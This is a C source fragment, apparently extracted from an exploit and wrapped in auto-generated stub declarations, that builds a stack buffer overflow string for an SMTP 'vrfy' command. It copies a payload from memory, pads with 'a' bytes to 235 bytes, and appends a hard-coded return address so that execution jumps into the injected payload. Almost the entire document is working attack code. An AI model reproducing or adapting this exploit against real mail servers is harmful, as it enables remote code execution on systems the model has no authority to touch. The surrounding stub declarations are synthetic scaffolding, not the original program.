#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  printf (char*) ; 
 int /*<<< orphan*/  s ; 
 unsigned int size ; 
 unsigned long start ; 
 int /*<<< orphan*/  strcat (int /*<<< orphan*/ ,...) ; 
 int /*<<< orphan*/  strcpy (int /*<<< orphan*/ ,char*) ; 
 unsigned int strlen (unsigned char*) ; 

void createOverflow(void)
 {
         unsigned char payload[236];
         unsigned char fillout[236];
         unsigned char ret[5];
         unsigned int i;
         unsigned long temp;
         unsigned char *p;

         // Create a string containing the payload
         temp = start;
         for (i=0; i<size; i++) {
                 p = (unsigned char*) temp;
                 payload[i] = *p;
                 temp++;
         }
         payload[i] = '\0';
         // Fill out with some 'a' until we hit the function return
         // address on the stack
         i = strlen(payload);
         while (i<235) {
                 fillout[i-strlen(payload)] = 'a';
                 i++;
         }
         fillout[i-strlen(payload)] = '\0';
         // Overwrite the return address to the location of the payload
         // inside the buffer
         ret[0] = 0x45;
         ret[1] = 0xF4;
         ret[2] = 0xF1;
         ret[3] = 0x01;
         ret[4] = 0x00;
         // Put together the whole vrfy overflow string
         strcpy(s, "vrfy xxxxx");
         strcat(s, payload);
         strcat(s, fillout);
         strcat(s, ret);
         strcat(s, "\r\n");
         printf("Created overflow string.\n");
 }